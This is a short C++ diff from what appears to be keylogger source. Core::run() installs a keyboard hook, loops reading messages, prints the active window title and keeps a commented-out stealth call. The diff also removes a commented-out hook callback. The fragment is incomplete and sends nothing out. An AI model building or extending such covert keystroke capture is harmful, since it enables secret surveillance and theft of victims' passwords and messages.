@@ -37,44 +37,16 @@ int	Core::storeLocally(const std::string &msg)
 int	Core::run()
 {
 	bool Continue = true;
+	//BOOL bRet;
 
 	if (keylog.installhook() == false)
 		Continue = false;
 	//keylog.stealth();
 
-
+	std::cout << keylog.GetActiveWindowTitle() << std::endl;
 	while (Continue)
 	{
-		keylog.getKey();
+		keylog.peekMsg();
 	}
 	return (0);
 }
-
-/* LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
-	CHAR szBuf[128];
-	HDC hdc;
-	static int c = 0;
-	size_t cch;
-	HRESULT hResult;
-
-	if (nCode < 0)  // do not process message 
-		return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode,
-			wParam, lParam);
-
-	hdc = GetDC(gh_hwndMain);
-	hResult = StringCchPrintf(szBuf, 128 / sizeof(TCHAR), "KEYBOARD - nCode: %d, vk: %d, %d times ", nCode, wParam, c++);
-	if (FAILED(hResult))
-	{
-		// TODO: write error handler
-	}
-	hResult = StringCchLength(szBuf, 128 / sizeof(TCHAR), &cch);
-	if (FAILED(hResult))
-	{
-		// TODO: write error handler
-	}
-	TextOut(hdc, 2, 115, szBuf, cch);
-	ReleaseDC(gh_hwndMain, hdc);
-
-	return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode, wParam, lParam);
-} */
